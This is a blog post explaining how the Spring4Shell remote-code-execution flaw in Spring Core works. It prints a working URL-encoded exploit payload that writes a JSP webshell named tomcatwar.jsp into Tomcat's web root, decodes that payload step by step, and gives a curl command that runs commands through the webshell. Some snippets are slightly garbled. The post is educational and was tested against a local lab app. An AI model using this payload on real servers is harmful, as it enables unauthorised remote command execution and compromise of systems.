Learning about Spring4Shell exploit
===================================

I’m pretty sure you might have heard about the infamous “Spring4Shell” exploit by now, so rather than boring you with the details about how it was discovered or how to exploit it. I’d like to explain how and why it works.

There are two parts to this:

1.  Spring4Shell: RCE in Spring Core ≤ 5.3.17
2.  CVE-2022–22964: RCE in Spring Cloud Function (≤ 3.1.6 and ≤ 3.2.2)

In this blog, I’m going to write about the vulnerability in Spring Core.

Rapid7 team have recreated and explained the entire thing really well.

```
package net.javaguides.springmvc.helloworld.controller;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.web.bind.annotation.RequestMapping;  import net.javaguides.springmvc.helloworld.model.HelloWorld;
/\*\*
  \*
  @author Ramesh Fadatare
  \*/
@Controller
public class HelloWorldController {
    @RequestMapping("/rapid7")
    public void vulnerable(HelloWorld model) {
    }
}
```

So, what’s happening here is, the `HelloWorldController` handles the HTTP requests to “http://target.com/appname/rapid7", the function `vulnerable` will handle those requests and the values passed along with them.

Also, this function has a POJO (Plain Old Java Object) parameter.

Here the vulnerability lies within the `@RequestMapping` annotation, which enables a “Class Loader Manipulation” attack. Let’s say we have something like this:

```
public class Counter {
    private long count;
    public long getCount() {
        return count;
    }
    public void setCount() {
        this.count = count;
    }
}@Controller
public class HelloController {
    @PostMapping("/count")
    public String getCount(@ModelAttribute Counter count, Model model) {
        return "Here is the count";
    }
}
```

Now, making a request to will give us the response “Here is the count”. That part is fine, it works really well, the problem arises when something other than just some random text is given as the request parameter, like:

```
class.module.classLoader.resources.context.parent.pipeline .first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(% 22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRunt ime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int% 20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20 while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7 D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context .parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources .context.parent.pipeline.first.directory=webapps/ROOT&class.module.cl assLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&cl ass.module.classLoader.resources.context.parent.pipeline.first.fileDat eFormat=
```

Okay, that doesn’t make much sense. Decoding and breaking it down…

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
if("j".equals(request.getParameter("pwd"))){
  java.io.InputStream in = %{c1}i.getRuntime()
      .exec(request.getParameter("cmd"))
      .getInputStream();
  int a = -1;
  byte\[\] b = new byte\[2048\];
  while((a=in.read(b))3D-1){
     out.println(new String(b));
  } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

First, it’s probably creating a basic JSP webshell payload

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
if("j".equals(request.getParameter("pwd"))){
  java.io.InputStream in = %{c1}i.getRuntime()
      .exec(request.getParameter("cmd"))
      .getInputStream();
  int a = -1;
  byte\[\] b = new byte\[2048\];
  while((a=in.read(b))3D-1){
     out.println(new String(b));
  } } %{suffix}i
```

Next, specifying the extension of the file it’s going to store the payload into

```
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
```

After that, it specifies the directory where the webshell can be kept

```
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
```

Giving the webshell a name

```
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
```

About this last one, I’m not sure exactly what it’s doing, but just by looking at it, it seems like it determines the “File Date Format”, maybe ?

```
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

So, that `curl` request is essentially is a collection of several statements joined together so that it is executed in one go.

After the payload file tomcatwar.jsp has been created in the webapp/ROOT directory we can execute commands:

```
curl http://localhost:8000/tomcatwar.jsp?pwd=j&cmd=whoami
```

This will give you the contents of `tomcatwar.jsp` file along with the result of `whoami`

I used this repo to host a vulnerable Spring Framework Application locally and test this vulenrability.

[https://github.com/jbaines-r7/spring4shell\_vulnapp](https://github.com/jbaines-r7/spring4shell_vulnapp)

References:

[

Spring4Shell: Zero-Day Vulnerability in Spring Framework | Rapid7 Blog
----------------------------------------------------------------------

### If you are like many in the cybersecurity industry, any mention of a zero-day in an open-source software (OSS) library…

www.rapid7.com

](https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/)[

Spring4Shell: Security Analysis of the latest Java RCE '0-day' vulnerabilities in Spring | LunaSec
--------------------------------------------------------------------------------------------------

### Logo courtesy of Daniel Christensen. On March 29th, 2022, two RCE vulnerabilities were being discussed on the internet…

www.lunasec.io

](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
